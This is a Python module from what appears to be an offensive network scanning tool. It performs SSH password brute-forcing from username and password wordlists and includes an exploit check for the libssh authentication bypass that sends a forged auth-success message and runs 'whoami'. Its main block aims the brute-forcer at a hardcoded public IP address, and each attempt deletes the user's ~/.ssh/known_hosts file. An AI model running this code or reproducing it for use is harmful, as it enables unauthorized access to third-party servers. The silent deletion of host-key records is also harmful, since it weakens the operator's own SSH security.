# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-02 22:05
import logging
import os

import asyncssh
import paramiko as paramiko
from asyncssh import SSHClientConnection, SSHClientConnectionOptions
from asyncssh.connection import _connect, _open_tunnel, _open_proxy
from asyncssh.misc import async_context_manager
from colorama import Fore
from tqdm import tqdm
import socket
import asyncio

# 抑制asyncssh
asyncssh.logger.setLevel(logging.CRITICAL)

# 封装SSH
# async def _connect(options, loop, flags, conn_factory, msg):
#     """Make outbound TCP or SSH tunneled connection"""
#
#     host = options.host
#     port = options.port
#     tunnel = options.tunnel
#     family = options.family
#     local_addr = options.local_addr
#     proxy_command = options.proxy_command
#     free_conn = True
#
#     new_tunnel = await _open_tunnel(tunnel)
#
#     if new_tunnel:
#         try:
#             _, conn = await new_tunnel.create_connection(conn_factory,
#                                                          host, port)
#         except Exception:
#             new_tunnel.close()
#             await new_tunnel.wait_closed()
#             raise
#         else:
#             conn.set_tunnel(new_tunnel)
#     elif tunnel:
#         _, conn = await tunnel.create_connection(conn_factory, host, port)
#     elif proxy_command:
#         conn = await _open_proxy(loop, proxy_command, conn_factory)
#     else:
#         _, conn = await loop.create_connection(conn_factory, host, port,
#                                                family=family, flags=flags,
#                                                local_addr=local_addr)
#
#     try:
#         await conn.wait_established()
#         free_conn = False
#
#         if new_tunnel:
#             conn.set_tunnel(new_tunnel)
#
#         return conn
#     finally:
#         if free_conn:
#             conn.abort()
#             await conn.wait_closed()
#
#
# @async_context_manager
# async def wrapperConnnect(host, port=(), *, tunnel=(), family=(), flags=0,
#                           local_addr=None, config=(), options=None, **kwargs):
#     def conn_factory():
#         """Return an SSH client connection factory"""
#
#         return SSHClientConnection(loop, options, wait='auth')
#
#     loop = asyncio.get_event_loop()
#
#     options = SSHClientConnectionOptions(options, config=config, host=host,
#                                          port=port, tunnel=tunnel,
#                                          family=family, local_addr=local_addr,
#                                          **kwargs)
#
#     return await _connect(options, loop, flags, conn_factory,
#                           'Opening SSH connection to')


async def checkRce(addr):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        loop = asyncio.get_event_loop()
        await loop.sock_connect(sock, (addr.split(':')[0], int(addr.split(':')[1])))
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
        spawncmd = transport.open_session(timeout=6)
        spawncmd.exec_command('whoami')
        if spawncmd.recv_exit_status() == 0:
            tqdm.write(Fore.RED + '[+] Target maybe libssh bypass, {}'.format(addr))
    except Exception:
        pass


async def checkWeakpass(addr, sshUPList):
    for username, password in sshUPList:
        try:
            known_hosts_path = os.path.join(os.path.expanduser('~'), '.ssh', 'known_hosts')
            if os.path.exists(known_hosts_path):
                os.remove(known_hosts_path)
            async with asyncssh.connect(host=addr.split(':')[0], port=int(addr.split(':')[1]), username=username,
                                           password=password, known_hosts=None) as connction:
                tqdm.write(Fore.RED + '[+] target maybe ssh weakpass, {}'.format(
                    str(addr) + ' | ' + str(username) + '/' + str(password)))
                return {'name': 'weakpass', 'url': str(addr) + ' | ' + str(username) + '/' + str(password),
                        'software': 'ssh'}
        except asyncssh.PermissionDenied:
            pass
        except asyncssh.TimeoutError:
            pass
        except asyncssh.misc.ConnectionLost:
            pass
        except Exception:
            pass


async def sshScan(addr, sshUPList, pbar):
    vulList = []
    # a = await checkRce(addr)
    # if a is not None:
    #     vulList.append(a)
    b = await checkWeakpass(addr, sshUPList)
    if b is not None:
        vulList.append(b)
    pbar.update(1)
    return vulList


if __name__ == '__main__':
    from core.utils.InformationProvider import InformationProvider

    sshUsernameList = InformationProvider.readFile(
        os.path.join(InformationProvider.dictPath, 'ssh_usernames.txt'))
    sshPasswordList = InformationProvider.readFile(
        os.path.join(InformationProvider.dictPath, 'ssh_passwords.txt'))
    sshUPList = InformationProvider.generate(sshUsernameList, sshPasswordList)
    loop = asyncio.get_event_loop()
    loop.run_until_complete(checkWeakpass('150.158.186.39:21', sshUPList))
